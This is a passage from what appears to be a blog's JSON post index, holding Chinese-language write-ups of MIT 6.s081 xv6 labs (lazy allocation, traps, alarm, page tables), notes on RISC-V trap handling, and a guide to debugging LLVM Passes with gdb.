allocation修改trap.c的代码，当用户空间发生缺页中断时，为进程新分配一个物理页并映射到发生缺页的虚拟地址处，然后返回用户代码继续执行。缺页中断对应scause寄存器的值为13或15，分别代表读/写，stval寄存器中保存造成缺页中断的虚拟地址va。当va超出了当前进程的内存大小时，说明出现了非法的地址访问，直接kill整个进程。在fork中，为子进程创建页表时，通过uvmcopy将父进程的用户地址空间的内存拷贝到子进程的用户地址空间，而在lazy allocation中，如果父进程页表中的某一项PTE不存在或者该PTE对应的物理页不存在，说明在父进程中没有对该页面的访问，因此在对子进程的页表初始化时也不需要分配这些表项，而是等到真正访问时再进行分配。在为进程新分配物理页失败时，说明当前系统的物理内存已经被占满，直接kill进程并释放对应的物理内存。在xv6中，栈的最低一页作为guardpage，用于检测用户栈分配时出现stack overflow错误，对于guard page中的地址，不应该读写，也不应该为其分配物理页，如果出现缺页的位置在guard page中，说明出现了栈溢出，应该kill掉整个进程，根据xv6进程地址空间的排布，对应的判断条件为PGROUNDDOWN(va) == r_sp()。完整的缺页中断处理代码如下：voidusertrap(void){\t//...... if(r_scause() == 8){ // system call } else if (r_scause() == 13 || r_scause() == 15) { // Kill a process if it page-faults on a virtual memory address higher than any allocated with sbrk() // virtual address that caused the page fault uint64 va = r_stval(); if (va &lt; p-&gt;sz &amp;&amp; PGROUNDDOWN(va) != r_sp() &amp;&amp; ((pte = walk(p-&gt;pagetable, va, 0)) == 0 || (*pte &amp; PTE_V) == 0)) { char *mem = kalloc(); if (mem == 0) { printf(\"out of memory\\n\"); p-&gt;killed = 1; } else { memset(mem, 0, PGSIZE); if (mappages(p-&gt;pagetable, PGROUNDDOWN(va), PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != 0) { printf(\"mappage failed when handling page fault\\n\"); kfree(mem); uvmdealloc(p-&gt;pagetable, PGROUNDDOWN(va), PGSIZE); } } } else { printf(\"illegal va: %p\", va); printf(\"usertrap(): unexpected scause %p pid=%d\\n\", r_scause(), p-&gt;pid); printf(\" sepc=%p stval=%p\\n\", r_sepc(), r_stval()); p-&gt;killed = 1; } } else if((which_dev = devintr()) != 0){ // ok } else { printf(\"usertrap(): unexpected scause %p pid=%d\\n\", r_scause(), p-&gt;pid); printf(\" sepc=%p stval=%p\\n\", r_sepc(), r_stval()); p-&gt;killed = 1; } if(p-&gt;killed) exit(-1); // give up the CPU if this is a timer interrupt. if(which_dev == 2) yield(); usertrapret();}当进程将虚拟地址作为参数传递给系统调用以供内核读写(copyin&amp;copyout)时，如果该虚拟地址刚刚通过sbrk分配，但是并没有映射到某个物理页，此时并不会触发缺页中断，而是会引起读写错误，对于这种情况应该首先检测虚拟地址是否存在对应的物理页面，如果对应的页面不存在，则先进行物理页面的分配，然后再进行读写，对应的代码如下：// Copy from kernel to user.// Copy len bytes from src to virtual address dstva in a given page table.// Return 0 on success, -1 on error.intcopyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len){ uint64 n, va0, pa0; pte_t *pte; struct proc *p = myproc(); if (dstva &lt; p-&gt;sz &amp;&amp; PGROUNDDOWN(dstva) != r_sp() &amp;&amp; (((pte = walk(p-&gt;pagetable, dstva, 0))==0) || ((*pte &amp; PTE_V)==0))) { if (dstva &gt;= p-&gt;sz || PGROUNDDOWN(dstva) == r_sp()) { printf(\"illegal va in copyin\\n\"); p-&gt;killed = 1; exit(-1); } char *mem = kalloc(); if (mem == 0) { printf(\"out of memory when copyin\\n\"); p-&gt;killed = 1; exit(-1); } else { memset(mem, 0, PGSIZE); if (mappages(p-&gt;pagetable, PGROUNDDOWN(dstva), PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != 0) { printf(\"mappage failed when handling copyin page fault\\n\"); kfree(mem); uvmdealloc(p-&gt;pagetable, PGROUNDDOWN(dstva), PGSIZE); } } } while(len &gt; 0){ va0 = PGROUNDDOWN(dstva); pa0 = walkaddr(pagetable, va0); if(pa0 == 0) return -1; n = PGSIZE - (dstva - va0); if(n &gt; len) n = len; memmove((void *)(pa0 + (dstva - va0)), src, n); len -= n; src += n; dstva = va0 + PGSIZE; } return 0;}// Copy from user to kernel.// Copy len bytes to dst from virtual address srcva in a given page table.// Return 0 on success, -1 on error.intcopyin(pagetable_t pagetable, char *dst, uint64 srcva, uint64 len){ uint64 n, va0, pa0; pte_t *pte; struct proc *p = myproc(); if (srcva &lt; p-&gt;sz &amp;&amp; PGROUNDDOWN(srcva) != r_sp() &amp;&amp; ((pte = walk(p-&gt;pagetable, srcva, 0)) == 0 || (*pte &amp; PTE_V) == 0)) { char *mem = kalloc(); if (mem == 0) { printf(\"out of memory when copyin\\n\"); p-&gt;killed = 1; } else { memset(mem, 0, PGSIZE); if (mappages(p-&gt;pagetable, PGROUNDDOWN(srcva), PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != 0) { printf(\"mappage failed when handling copyin page fault\\n\"); kfree(mem); uvmdealloc(p-&gt;pagetable, PGROUNDDOWN(srcva), PGSIZE); } } } while(len &gt; 0){ va0 = PGROUNDDOWN(srcva); pa0 = walkaddr(pagetable, va0); if(pa0 == 0) return -1; n = PGSIZE - (srcva - va0); if(n &gt; len) n = len; memmove(dst, (void *)(pa0 + (srcva - va0)), n); len -= n; dst += n; srcva = va0 + PGSIZE; } return 0;}完成以上修改后，顺利通过lazytests和usertests。" }, { "title": "MIT 6.s081 Lab traps", "url": "/_posts/MIT-6.s081-Lab-traps/", "categories": "operating system, xv6", "tags": "operating system, xv6", "date": "2023-04-05 00:00:00 +0000", "snippet": " Lab: Traps (mit.edu)RISC-V assembly1. Which registers contain arguments to functions? For example, which register holds 13 in main’s call to printf?在main函数中，对printf的调用如下： printf(\"%d %d\\n\", f(8)+1...", "content": " Lab: Traps (mit.edu)RISC-V assembly1. Which registers contain arguments to functions? For example, which register holds 13 in main’s call to printf?在main函数中，对printf的调用如下： printf(\"%d %d\\n\", f(8)+1, 13);  24: 4635                 li a2,13  26: 45b1                 li a1,12  28: 00000517             auipc a0,0x0  2c: 7b050513             addi  a0,a0,1968 # 7d8 &lt;malloc+0xea&gt;  30: 00000097             auipc ra,0x0  34: 600080e7             jalr  1536(ra) # 630 &lt;printf&gt;可以看到通过li指令将13加载到了a2寄存器，将12加载到了a1寄存器，而12这里是在编译时编译器计算出了f(8)+1的值。在设置了a1和a2这两个寄存器的值后，执行了auipc这条指令。auipc rd, immediate的作用是PC加立即数，也就是把符号位扩展的高20位左移12位加到PC上，结果写入到rd中。auipc a0, 0x0的作用是将pc的值写入到a0寄存器中，然后addi a0, a0, 1968，使a0中的值变为0x7d8。auipc ra, 0x0，取pc到ra寄存器，该指令对应的pc为0x30，然后通过jalr 1536(ra)进行无条件跳转，即跳转到0x30+0x600=0x640的位置，开始printf函数的执行。2.Where is the call to function f in the assembly code for main? Where is the call to g? (Hint: the compiler may inline functions.)并没有调用，f和g两个函数都被内联了3.At what address is the function printf located?0x6404. What value is in the register ra just after the jalr to printf in main?jalr指令跳转时，ra的值为0x30，而jalr将其下一条指令的值存入ra寄存器，因此跳转后ra寄存器的值为0x385. Run the following code.What is the output?If the RISC-V were instead big-endian what would you set i to in order to yield the same output? Would you need to change 57616 to a different value?unsigned int i = 0x00646c72;printf(\"H%x Wo%s\", 57616, &amp;i);输出为HE110 World. 57616对应的十六进制数位E110，RISC-V是小端的，也就是说i在内存从低位到高位的字节依次是72 6c 64 00，printf中参数%s将i作为字符串输出，72转换成ASCII码为r，6c为l，64为d.如果是大端法，i应该设置为0x726c6400，57616不需要修改。6. In the following code, what is going to be printed after 'y='? (note: the answer is not a specific value.) Why does this happen?printf(\"x=%d y=%d\", 3);根据汇编代码，printf将a2寄存器的值作为第三个参数，也就是说a2寄存器的值是什么，y就等于什么。Backtrace在kernel/printf.c中实现backtrace()函数，输出函数调用的堆栈信息。编译器在每个函数栈帧中保存了caller的函数栈帧地址，因此backtrace可以利用这些栈帧指针不断回溯caller的栈帧。当前正在执行的函数栈帧指针保存在s0寄存器中，可以通过r_fp函数读取：static inline uint64r_fp(){\tuint64 x;\tasm volatile(\"mv %0, s0\" : \"=r\"(x));\treturn x;}函数栈帧的布局：从上图可以看出，函数调用栈向下增长，sp指针保存的是当前函数栈的栈顶，fp保存的是当前栈的栈底。当前函数的返回地址保存在fp-8位置处，而指向caller的fp的指针保存在fp-16位置处。xv6为每个栈分配一个页，因此可以使用PGROUNDUP获得当前栈的最高地址，backtrace的完整代码如下：voidbacktrace(void){  printf(\"backtrace:\\n\");  uint64 cur_frame_pointer = r_fp();  while (cur_frame_pointer &lt; PGROUNDUP(cur_frame_pointer)) {    printf(\"%p\\n\", *((uint64*)(cur_frame_pointer-8)));    cur_frame_pointer = *((uint64*)(cur_frame_pointer - 16));  }}Alarm添加一个sigalarm(interval, handler)系统调用，当应用调用signalarm(n, fn)时，每经过n个CPU中断，内核调用一次fn。当fn返回时，要求能够恢复到应用原本的上下文继续执行。test0: invoke handler按照MIT 6.s081 Lab system calls | clingfei中类似的过程，首先在user/user.h中添加系统调用sigalarm和sigreturn：int sigalarm(int ticks, void (*handler)());int sigreturn(void);并在syscall.c和syscall.h中添加sys_signalarm和sys_return的声明。根据hint，目前sigreturn只需要返回0：uint64 sys_sigreturn(void) {\treturn 0;}sys_sigalarm()需要在proc结构体中保存alarm interval和指向handler function的指针，分别对应系统调用参数中的interval和handler：uint64 sys_sigalarm(void) {    struct proc* p = myproc();    if (argint(0, &amp;p-&gt;interval) &lt; 0 || argaddr(1, &amp;p-&gt;handler) &lt; 0)      return -1;    // printf(\"interval: %d, handler: %p\", p-&gt;interval, p-&gt;handler);\t// p-&gt;ticks_since_last = 0;    return 0;}在proc结构体中添加与alarm有关的信息，其中interval和handler用于保存系统调用参数，而ticks_since_last用于记录距离上次调用handler已经发生了几次时钟中断（在allocproc时置0）：struct proc {\t......\tint interval; \tuint64 handler;\tuint64 ticks_since_last;};对于每次时钟中断，在usertrap函数中被处理，其中时钟中断对应的是设备中断，根据dev_intr的定义，当时钟中断发生时返回值为2，因此当which_dev为2时，使ticks_since_last+1，并判断ticks_since_last是否等于interval，设置p-&gt;trapframe-&gt;epc为p-&gt;handler，其中p-&gt;handler中保存的是系统调用时传递的参数地址，在usertrapret返回到用户态时，从trapframe中取出epc装入pc，从而执行handler：voidusertrap(void){ int which_dev = 0; if((r_sstatus() &amp; SSTATUS_SPP) != 0) panic(\"usertrap: not from user mode\"); // send interrupts and exceptions to kerneltrap(), // since we're now in the kernel. w_stvec((uint64)kernelvec); struct proc *p = myproc(); // save user program counter. p-&gt;trapframe-&gt;epc = r_sepc(); if(r_scause() == 8){ // system call if(p-&gt;killed) exit(-1); // sepc points to the ecall instruction, // but we want to return to the next instruction. p-&gt;trapframe-&gt;epc += 4; // an interrupt will change sstatus &amp;c registers, // so don't enable until done with those registers. intr_on(); syscall(); } else if((which_dev = devintr()) != 0){ // ok // only manipulate a process's alarm ticks if there is a timer interrupt if (which_dev == 2) { p-&gt;ticks_since_last++; if (p-&gt;ticks_since_last == p-&gt;interval) { p-&gt;trapframe-&gt;epc = p-&gt;handler; } } } else { printf(\"usertrap(): unexpected scause %p pid=%d\\n\", r_scause(), p-&gt;pid); printf(\" sepc=%p stval=%p\\n\", r_sepc(), r_stval()); p-&gt;killed = 1; } if(p-&gt;killed) exit(-1); // give up the CPU if this is a timer interrupt. if(which_dev == 2) yield(); usertrapret();}运行alarmtest，成功通过test0test1/test2(): resume interrupted code上述代码能够调用handler，但是无法回到用户程序执行系统调用时的上下文继续执行。alarmtest.c中的periodic，也就是上文所说的handler的定义如下：voidperiodic(){ count = count + 1; printf(\"alarm!\\n\"); sigreturn();}也就是说，在handler中会调用sigreturn函数，用于返回系统调用时的上下文。实验指导中给出了提示： Your solution will require you to save and restore registers—what registers do you need to save and restore to resume the interrupted code correctly? (Hint: it will be many).随之产生了一个疑问，在系统调用时uservec已经保存了所有的寄存器到trapframe中，返回时userret也从trapframe中恢复了寄存器，为什么这里依然说需要保存和恢复寄存器？仔细观察usertrap中的代码，可以看到在发生时钟中断，usertrap进入时，通过p-&gt;trapframe-&gt;epc = r_sepc();保存了sepc寄存器到trapframe中，此时的pc指向的是时钟中断时正在执行的代码，但是对于时钟中断，在调用handler时，使用handler的指针覆盖了epc，从而导致之前保存的epc丢失。然后执行yield进行进程调度，当再次切换到该进程执行时，首先通过usertrapret和userret返回到用户态，此时除了sepc寄存器指向handler外，其他的寄存器都与发生时钟中断时一致，但是handler执行完，再进行系统调用sigreturn，此时一方面寄存器的值被handler改变，另一方面之前的epc也被覆盖。为了能够在sigreturn中恢复到时钟中断时的执行现场，需要在uservec之外，再对寄存器做一次备份。在proc中添加一个trapframe类型的指针，称为trapframecopy。对于时钟中断，在usertrap中修改epc为handler之前，首先保存当前的trapframe到trapframecopy， 由于trapframe只占用了前280个字节，因此直接将trapframe页的后一半交给trapframecopy：voidusertrap(void){ int which_dev = 0; if((r_sstatus() &amp; SSTATUS_SPP) != 0) panic(\"usertrap: not from user mode\"); // send interrupts and exceptions to kerneltrap(), // since we're now in the kernel. w_stvec((uint64)kernelvec); struct proc *p = myproc(); // save user program counter. p-&gt;trapframe-&gt;epc = r_sepc(); if(r_scause() == 8){ // system call\t//...... } else if((which_dev = devintr()) != 0){ // ok // only manipulate a process's alarm ticks if there is a timer interrupt if (which_dev == 2) { p-&gt;ticks_since_last++; if (p-&gt;ticks_since_last == p-&gt;interval) { p-&gt;trapframecopy = p-&gt;trapframe + 512; memmove(p-&gt;trapframecopy, p-&gt;trapframe, sizeof(struct trapframe)); p-&gt;trapframe-&gt;epc = p-&gt;handler; } } } else {\t//...... } if(p-&gt;killed) exit(-1); // give up the CPU if this is a timer interrupt. if(which_dev == 2) yield(); usertrapret();}在sys_sigreturn中，从trapframecopy拷贝回trapframe：uint64 sys_sigreturn(void) { struct proc *p = myproc(); if (p-&gt;trapframecopy != 0) { memmove(p-&gt;trapframe, p-&gt;trapframecopy, sizeof(struct trapframe)); } p-&gt;ticks_since_last = 0; p-&gt;trapframecopy = 0; return 0;}为了防止在handler返回前内核再次调用handler，在sys_sigreturn返回前将ticks_since_last置0，这样即使再次发生时钟中断，由于当前执行时ticks_since_last已经等于interval，因此只会使ticks_since_last不断+1，而不会再次设置epc为handler，从而防止再次调用。完成上述修改后，成功通过alarmtest和usertests。" }, { "title": "xv6 trap and system call notes", "url": "/_posts/Trap-and-system-calls/", "categories": "operating system, xv6", "tags": "operating system, xv6", "date": "2023-04-04 00:00:00 +0000", "snippet": "trap包括三种情况： 系统调用，用户程序执行ecall指令切换到内核态执行对应的系统调用处理程序 异常，用户或内核执行某些非法指令，例如除零或访问无效的虚拟地址 设备中断 与trap有关的控制寄存器 stvec: 保存trap处理程序的地址 sepc: trap发生时，pc将会切换到trap处理程序的首地址，而sepc用于保存被中断的程序计数器的...", "content": "trap包括三种情况： 系统调用，用户程序执行ecall指令切换到内核态执行对应的系统调用处理程序 异常，用户或内核执行某些非法指令，例如除零或访问无效的虚拟地址 设备中断 与trap有关的控制寄存器 stvec: 保存trap处理程序的地址 sepc: trap发生时，pc将会切换到trap处理程序的首地址，而sepc用于保存被中断的程序计数器的值。在sret返回时，将sepc寄存器的值加载到pc中 scause：保存trap发生的原因 sscratch：指向每个进程的trapframe的地址，在陷入处理程序起始时使用，同时用于保存a0寄存器 sstatus：SIE位表示当前开启了设备中断，如果SIE位为0，RISC-V将会推迟设备中断的处理，直到内核将SIE置位。SPP位表示trap来自于用户模式还是supervisor模式，并在返回时决定跳转到user还是supervisor。上述寄存器仅能在supervisor模式下访问。RISC-V硬件处理trap 如果trap是由设备中断引起的，并且当前sstatus 的SIE位为0，则无需处理，等待内核再次将SIE设置为1时再处理。 SIE位清0，关闭设备中断 将pc保存到sepc寄存器 保存当前模式到sstatus的SPP位 将trap发生原因保存到scause寄存器 将模式切换到supervisor 将stvec寄存器的值加载到pc，即切换到trap处理程序执行 按照pc所指的位置执行trap处理程序在RISC-V中，CPU仅保存了并切换了PC的值，而并没有切换到内核页表和内核栈，这一部分工作是由操作系统内核实现的，这样做是为了为操作系统保留足够的灵活性，因为某些操作系统可能在处理trap时并不需要切换页表，从而能够提高性能。trap from user space上面提到的stvec寄存器中实际上保存的是uservec的入口地址。在处理陷入时，首先执行uservec，然后执行usertrap。在从陷入返回时，首先执行usertrapret，然后执行userret。由于RISC-V硬件在处理trap时，并不会切换页表，因此从用户页表到内核页表的切换是由uservec来完成的，同时为了uservec在进程切换到内核页表后能够继续执行，因此uservec在用户页表和内核页表中应该具有相同的映射。实际上uservec保存在trampoline页中，从下面两张图可以看出，trampoline页在用户页表和内核页表中，都是占据了MAXVA-PAGESIZE~MAXVA这一块虚拟地址空间，因此具有相同的虚拟地址，并且会映射到相同的物理地址。在uservec开始执行时，RISC-V CPU的32个寄存器中保存着被中断的代码的值，uservec需要保存这些寄存器的值，以保证在trap返回时能够继续执行。但是，无论是设置satp以加载内核页表还是保存寄存器现场，uservec都需要使用寄存器，从而就会修改上面说的某些寄存器的值。为了解决这个问题，uservec利用了RISC-V的sscratch寄存器和csrrw指令，将a0寄存器与sscratch寄存器的值进行交换，即将a0寄存器的值保存到sscratch寄存器中，而此时a0寄存器中保存了当前进程的trapframe的地址。随后，uservec将所有的寄存器（包括目前存在于sscratch中的a0寄存器）的值保存在trapframe页中。（此时进程页表尚未切换到内核态，因此寄存器保存在用户地址空间）同时trapframe中还保存有当前进程内核栈的指针，当前CPU的hartid（硬件线程号），usertrap的地址以及内核页表的地址。uservec从trapframe中取出这些值，将内核页表加载到satp寄存器中，跳转到usertrap执行。usertrap首先判断陷入的类型，并调用对应的处理函数，最后调用usertrapret返回。首先设置stvec寄存器为kernelvec的地址，从而使kernelvec处理来自内核态的trap。然后保存sepc寄存器的值（此时sepc中保存的是在陷入时由硬件自动保存的被中断的用户程序的PC），因为usertrap中可能会出现导致sepc中的值被覆盖的进程切换，随后根据陷入类型调用不同的处理函数：syscall/devintr/kill。（特殊情况：对于系统调用，在陷入时pc指向ecall这条指令，因此需要对trapframe中的pc值+4，使返回时执行ecall的后一条指令，而不是再次陷入内核）。在处理完陷入后，首先调用usertrapret。usertrap首先恢复RISC-V的控制寄存器以供下次陷入使用。包括使stvec指向uservec（该寄存器在usertrap中设置为指向kernelvec），设置uservec中使用的保存在trapframe中的值（包括当前进程内核栈的指针、CPU的hartid、usertrap的地址和内核页表的地址等），将usertrap中保存的pc的值恢复到sepc。最后调用userret，与uservec类似，由于该部分代码需要设置satp寄存器以实现内核页表到用户页表的切换，因此同样保存在trampoline中。usertrapret在调用userret时传递了两个参数，其中a0寄存器中保存了进程的用户页表的地址，a1寄存器中保存了TRAPFRAME的地址。userret将satp寄存器设置为用户页表的地址，从trapframe中拷贝a0的值到sscratch寄存器，之后userret从trapframe中恢复其他保存的寄存器的值，并交换a0和sscratch两个寄存器，以使sscratch重新指向进程的trapframe。此时完成了对于中断现场的恢复，最后执行sret恢复到用户态继续执行之前被中断的代码。traps from kernel spacexv6在执行内核代码时，stvec寄存器指向的是kernelvec。与uservec不同，kernelvec不需要进行用户页表到内核页表的切换和用户栈到内核栈的切换，只需要保存当前所有寄存器的值到内核栈。保存现场后，kernelvec跳转到kerneltrap，用于处理两种类型的陷入：设备中断和异常。如果陷入的原因是时钟中断，并且此时正在运行的是一个进程对应的内核线程而不是scheduler，kerneltrap将会调用yield以切换线程执行。kerneltrap返回时，恢复保存的sepc和sstatue寄存器的值，然后返回到kernelvec。kernelvec从栈中恢复保存的上下文。当CPU从用户空间进入到内核态时，需要将stvec设置成kernelvec，而在进入内核态到设置为kernelvec之间，需要关闭中断，否则一旦出现中断，根据stvec将会调用uservec，而此时系统已经处于内核态，从而会引起整个系统的混乱。在设置stvec为kernelvec之后，再重新开启中断。Referencexv6: a simple, Unix-like teaching operating system (mit.edu)" }, { "title": "如何使用gdb调试LLVM Pass？", "url": "/_posts/how-to-debug-LLVM-Pass/", "categories": "LLVM, gdb", "tags": "LLVM, gdb, debug", "date": "2023-03-29 00:00:00 +0000", "snippet": "前置知识本文使用的LLVM 版本为10.0，使用LegacyPassManager管理Pass。由于LLVM Pass被编译为运行时动态加载的链接库，因此与普通的可执行文件不同，无法使用gdb在加载文件之后设置断点。LLVM Pass编译的.so文件通过opt动态加载执行，opt是模块化的LLVM优化器和分析器，使用LLVM源文件作为输入，在源文件上运行指定的优化或分析程序，然后输出优化/分...", "content": "前置知识本文使用的LLVM 版本为10.0，使用LegacyPassManager管理Pass。由于LLVM Pass被编译为运行时动态加载的链接库，因此与普通的可执行文件不同，无法使用gdb在加载文件之后设置断点。LLVM Pass编译的.so文件通过opt动态加载执行，opt是模块化的LLVM优化器和分析器，使用LLVM源文件作为输入，在源文件上运行指定的优化或分析程序，然后输出优化/分析后的结果。使用opt运行Pass的基本命令为：opt -load pass.so -passname sourcefile为Pass设置断点 由于Pass通过opt动态加载，因此首先使用gdb加载opt： gdb opt 首先需要确保LLVM编译时开启了编译选项，如果没有开启，使用gdb加载opt时会出现： Reading symbols from ./opt...(No debugging symbols found in ./opt) 此时需要从源码重新编译LLVM，并将新编编译出的bin目录添加到环境变量中。 而正确开启了编译选项的opt在gdb中的输出为： 为了给我们想要debug的Pass设置断点，我们首先需要找到加载Pass后Pass执行之前的代码设置断点，以得到给Pass设置断点的机会。 LLVM文档中给出的断点可以设置为 break llvm::PassManager::run stackoverflow中给出的断点可以设置为 break llvm::Pass::preparePassManager 经过测试，在LLVM 10.0中无法命中llvm::PassManager::run这一断点，而llvm::Pass::preparePassManager可以多次命中。 加载Pass： run -load pass.so -passname xxxx.bc 程序将会暂停在llvm::Pass::preparePassManager这一断点处，之后可以直接为Pass添加断点，并将preparePassManager这一断点移除，进入正常的debug流程。 遇到的问题： 在重新编译LLVM后，使用opt加载Pass报错： : CommandLine Error: Option 'help-list' registered more than once!LLVM ERROR: inconsistency in registered CommandLine options 推测是由于Debug版本的clang和Release版本的clang编译出的Pass符号不同，导致在使用opt加载时命令行参数出现冲突，通过重新设置环境变量、重新编译Pass后解决 使用gdb调试，加载opt并设置断点后，通过run -load加载Pass出错： Error opening 'passname.so': /path/to/passname.so: undefined symbol: _ZN4llvm24DisableABIBreakingChecksE -load request ignored. 通过c++filt查看该符号，得到： $ c++filt _ZN4llvm24DisableABIBreakingChecksEllvm::DisableABIBreakingChecks Google得知，在llvm/Config/abi-breaking.h中EnableABIBreakingChecks和DisableABIBreakingChecks的定义如下： namespace llvm {#if LLVM_ENABLE_ABI_BREAKING_CHECKSextern int EnableABIBreakingChecks;LLVM_HIDDEN_VISIBILITY__attribute__((weak)) int *VerifyEnableABIBreakingChecks = &amp;EnableABIBreakingChecks;#elseextern int DisableABIBreakingChecks;LLVM_HIDDEN_VISIBILITY__attribute__((weak)) int *VerifyDisableABIBreakingChecks = &amp;DisableABIBreakingChecks;#endif} 从上述代码可以得到，通过设置编译选项，将LLVM_ENABLE_ABI_BREAKING_CHECKS设置为false就会产生对于DisableABIBreakingChecks这一符号的定义。 根据LLVM文档中对LLVM_ABI_BREAKING_CHECKS的说明: Used to decide if LLVM should be built with ABI breaking checks or not. Allowed values are WITH_ASSERTS (default), FORCE_ON and FORCE_OFF. WITH_ASSERTS turns on ABI breaking checks in an assertion enabled build. FORCE_ON (FORCE_OFF) turns them on (off) irrespective of whether normal (NDEBUG-based) assertions are enabled or not. A version of LLVM built with ABI breaking checks is not ABI compatible with a version built without it. 因此只要在编译时将LLVM_ABI_BREAKING_CHECKS设置为FORCE_OFF即可关闭ABI breaking check。在cmake中添加-DLLVM_ABI_BREAKING_CHECKS=FORCE_OFF重新编译Pass，即可成功在gdb中运行。 Reference Writing an LLVM Pass — LLVM 17.0.0git documentation Debugging an llvm pass with gdb - Stack Overflow Building LLVM with CMake — LLVM 17.0.0git documentation Using LLVM headers gives a compilation error : learncpp (reddit.com)" }, { "title": "MIT 6.s081 Lab page tables", "url": "/_posts/MIT-6.s081-Lab-pagetable/", "categories": "operating system, xv6", "tags": "operating system, xv6", "date": "2023-03-21 00:00:00 +0000", "snippet": " Lab: page tables (mit.edu)Print a page table实现vmprint函数，接收一个pagetable_t类型的参数，然后按照规定格式输出pte和pa，功能是输出给定进程的页表，例如：page table 0x0000000087f6e000..0: pte 0x0000000021fda801 pa 0x0000000087f6a000.. ..0:...", "content": " Lab: page tables (mit.edu)Print a page table实现vmprint函数，接收一个pagetable_t类型的参数，然后按照规定格式输出pte和pa，功能是输出给定进程的页表，例如：page table 0x0000000087f6e000..0: pte 0x0000000021fda801 pa 0x0000000087f6a000.. ..0: pte 0x0000000021fda401 pa 0x0000000087f69000.. .. ..0: pte 0x0000000021fdac1f pa 0x0000000087f6b000.. .. ..1: pte 0x0000000021fda00f pa 0x0000000087f68000.. .. ..2: pte 0x0000000021fd9c1f pa 0x0000000087f67000..255: pte 0x0000000021fdb401 pa 0x0000000087f6d000.. ..511: pte 0x0000000021fdb001 pa 0x0000000087f6c000.. .. ..510: pte 0x0000000021fdd807 pa 0x0000000087f76000.. .. ..511: pte 0x0000000020001c0b pa 0x0000000080007000risc-v采用三级页表，因此当页表深度&gt;3时直接返回。每个页表占1页，每页4096字节，每个pte64位，共8字节，因此每个页中有512个pte。对于每个pagetable，遍历512个pte，如果该pte的PTE_V位为1，说明有效，可以通过PTE2PA获得该pte所对应的物理地址，输出pte和pa，并将pa作为下一级页表地址，继续输出，完整代码如下：void vmprint_r(pagetable_t pagetable, int curdepth) { if (curdepth &gt; 3) return; for (int i = 0; i &lt; 512; i++) { pte_t pte = pagetable[i]; if(pte &amp; PTE_V) { printf(\"..\"); for (int j = 1; j &lt; curdepth; j++) { printf(\" ..\"); } uint64 pa = PTE2PA(pte); printf(\"%d: pte %p pa %p\\n\", i, pte, pa); vmprint_r((pagetable_t)pa, curdepth + 1); } }}voidvmprint(pagetable_t pagetable) { printf(\"page table %p\\n\", pagetable); vmprint_r(pagetable, 1);}A kernel page table per processxv6在内核态执行时，不同进程共用一个内核页表，采用直接映射方式，即内核态下虚拟地址x直接映射到物理地址x，而在用户态执行时，不同进程各自有一个用户地址空间，从虚拟地址0开始映射到物理地址。在内核态下采用直接映射的好处是可以简化内核对物理地址读写的操作。例如，在fork时，需要为子进程分配用户内存，分配器返回物理地址，然后fork在将父进程的用户内存拷贝到子进程的用户内存时，不需要再进行一次内存映射，而是直接将分配器返回的物理地址当作虚拟地址来使用。内核页表中不存在到用户内存的映射，因此用户地址空间的地址在内核态下是无效的，因此当内核需要使用在系统调用中传递的用户空间的指针时，首先需要将该指针转换为物理地址。这部分的目的就是为了解决这个问题，在内核页表中添加到用户空间的映射，从而能够直接根据内核页表对用户地址进行解引用而不需要进行额外的地址翻译操作。首先需要为每个进程添加一个内核页表，从而使每个进程在内核态下执行时具有单独的地址空间。在struct proc中添加一个字段：struct proc { ... uint64 sz; // Size of process memory (bytes) pagetable_t pagetable; // User page table pagetable_t kernel_pagetable; // Kernel page table struct trapframe *trapframe; // data page for trampoline.S ...};在allocproc中创建进程时，需要对内核页表进行初始化，分别仿照kvminit和procinit设置内核页表和内核栈：static struct proc*allocproc(void){\t......found: p-&gt;kernel_pagetable = kernelvminit(); if (p-&gt;kernel_pagetable == 0) { freeproc(p); release(&amp;p-&gt;lock); return 0; } if (mappages(p-&gt;kernel_pagetable, TRAPFRAME, PGSIZE, (uint64)(p-&gt;trapframe), PTE_R | PTE_W) != 0) panic(\"map frame\"); // An empty user page table. p-&gt;pagetable = proc_pagetable(p); if(p-&gt;pagetable == 0){ freeproc(p); release(&amp;p-&gt;lock); return 0; } char *pa = kalloc(); if (pa == 0) panic(\"alloc KSTACK\"); memset(pa, 0, PGSIZE); uint64 va = KSTACK((int) 0); if (mappages(p-&gt;kernel_pagetable, va, PGSIZE, (uint64)pa, PTE_R | PTE_W) != 0) panic(\"map kstack\"); p-&gt;kstack = va;\t...... return p;}kernelvminit和kvminit的区别在于，kvminit用于初始化整个内核的内核页表，kernelvminit用于初始化各个进程的内核页表。在为每个进程添加了内核页表之后，全局的kernel_pagetable仅在CPU空转时由0号进程使用，而其他进程占用CPU时使用自己的内核页表，对应地，由于CLINT仅在内核启动时使用，因此在初始化每个进程的内核页表时不需要映射这部分：void pagemap(pagetable_t pagetable, uint64 va, uint64 pa, uint64 sz, int perm) { if(mappages(pagetable, va, sz, pa, perm) != 0) panic(\"pagemap\");}// implement a modified version of kvminit that makes a new page table // instead of modifying kernel_pagetablepagetable_t kernelvminit() { pagetable_t pagetable = (pagetable_t) kalloc(); memset(pagetable, 0, PGSIZE); // 应该map到新创建的pagetabe，而不是映射到原本的页表 // uart registers pagemap(pagetable, UART0, UART0, PGSIZE, PTE_R | PTE_W); // virtio mmio disk interface pagemap(pagetable, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W); // CLINT // pagemap(pagetable, CLINT, CLINT, 0x10000, PTE_R | PTE_W); // PLIC pagemap(pagetable, PLIC, PLIC, 0x400000, PTE_R | PTE_W); // map kernel text executable and read-only. pagemap(pagetable, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X); // map kernel data and the physical RAM we'll make use of. pagemap(pagetable, (uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W); // map the trampoline for trap entry/exit to // the highest virtual address in the kernel. pagemap(pagetable, TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X); return 